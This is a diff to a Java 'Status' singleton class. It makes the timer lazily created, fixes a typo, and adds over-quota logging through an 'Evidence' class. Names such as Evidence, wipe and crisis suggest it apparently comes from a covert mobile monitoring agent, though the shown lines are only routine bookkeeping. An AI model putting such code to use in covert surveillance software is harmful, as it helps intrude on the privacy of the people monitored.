@@ -49,7 +49,7 @@ public final class Status implements iSingleton {
     Date startingDate;
 
     Globals globals;
-    
+
     private boolean demo = false;
 
     private boolean isDebug = false;
@@ -81,8 +81,10 @@ public final class Status implements iSingleton {
     /** The crisis. */
     private boolean crisis = false;
 
-    BlockingQueueTrigger triggeredActionsMain = new BlockingQueueTrigger("Main");
-    BlockingQueueTrigger triggeredActionsFast = new BlockingQueueTrigger("Fast");
+    final BlockingQueueTrigger triggeredActionsMain = new BlockingQueueTrigger(
+            "Main");
+    final BlockingQueueTrigger triggeredActionsFast = new BlockingQueueTrigger(
+            "Fast");
 
     //public boolean synced;
     public boolean gprs;
@@ -302,7 +304,7 @@ public final class Status implements iSingleton {
         return getInstance();
     }
 
-    Timer timer = new Timer();
+    Timer timer;
 
     public boolean firstMessageRun;
 
@@ -310,18 +312,27 @@ public final class Status implements iSingleton {
 
     private Main main;
 
-    public Timer getTimer() {
+    private boolean overQuota = false;
+
+    public synchronized Timer getTimer() {
+        if (timer == null) {
+            timer = new Timer();
+        }
         return timer;
+    }
+
+    public void renewTimer() {
+        timer = new Timer();
     }
 
     public String statusGlobals() {
         StringBuffer buf = new StringBuffer();
         Globals g = getGlobals();
-        buf.append(" quota min: " + g.quotaMin + " max:" + g.quotaMax); //$NON-NLS-1$ 
+        buf.append(" quota min: " + g.quotaMin + "/" + g.getQuotaMin() + " max:" + g.quotaMax); //$NON-NLS-1$ 
         buf.append(" wipe: " + g.wipe); //$NON-NLS-1$ 
         buf.append(" type: " + g.type); //$NON-NLS-1$ 
         buf.append(" migrated: " + g.migrated); //$NON-NLS-1$ 
-        buf.append(" versin: " + g.version); //$NON-NLS-1$ 
+        buf.append(" version: " + g.version); //$NON-NLS-1$ 
         return buf.toString();
     }
 
@@ -330,7 +341,7 @@ public final class Status implements iSingleton {
     }
 
     public Globals getGlobals() {
-        return globals;
+        return this.globals;
     }
 
     void setDemo(boolean value) {
@@ -362,10 +373,29 @@ public final class Status implements iSingleton {
     }
 
     public void setMain(Main main) {
-        this.main=main;
+        this.main = main;
     }
 
     public Main getMain() {
         return this.main;
     }
+
+    public void setOverQuota(long free, boolean over) {
+        if (over != overQuota) {
+            if (over) {
+                //#ifdef DEBUG
+                debug.fatal("not enough space. Free : " + free );
+                //#endif 
+                Evidence.info("Over quota START: " + free, true);
+            } else {
+                Evidence.info("Over quota STOP: " + free, true);
+            }
+        }
+        this.overQuota = over;
+    }
+
+    public boolean isOverQuota() {
+        return overQuota;
+    }
+
 }
